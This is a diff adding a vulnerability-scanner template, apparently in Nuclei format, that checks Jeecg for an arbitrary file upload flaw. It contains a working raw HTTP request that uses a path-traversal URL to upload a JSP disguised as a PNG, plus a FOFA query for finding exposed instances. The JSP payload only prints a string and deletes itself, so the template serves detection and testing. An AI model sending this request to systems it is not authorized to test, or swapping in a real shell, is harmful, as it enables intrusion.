@@ -1,0 +1,48 @@
+id: jeecg-arbitrary-file-upload
+
+info:
+  name: Jeecg Arbitrary File Upload
+  author: ProjectDiscoveryAI,dostghost
+  severity: high
+  description: |
+    This template checks for an arbitrary file upload vulnerability in the Jeecg framework, enabling attackers to upload malicious files.
+  reference:
+    - https://github.com/AboSteam/POPC/blob/main/Jeecg%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: app="JEECG"
+  tags: file-upload,vulnerability,jeecg
+
+http:
+  - raw:
+      - |
+        POST /api/../commonController.do?parserXml HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Length: 463
+        User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95)
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+        Connection: close
+
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="name"
+
+        zW9YCa.png
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="documentTitle"
+
+        blank
+        ------WebKitFormBoundarygcflwtei
+        Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"
+        Content-Type: image/png
+
+        <% out.println("HelloWorld");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundarygcflwtei--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "filename":\s*".*\\.txt"
+        part: body
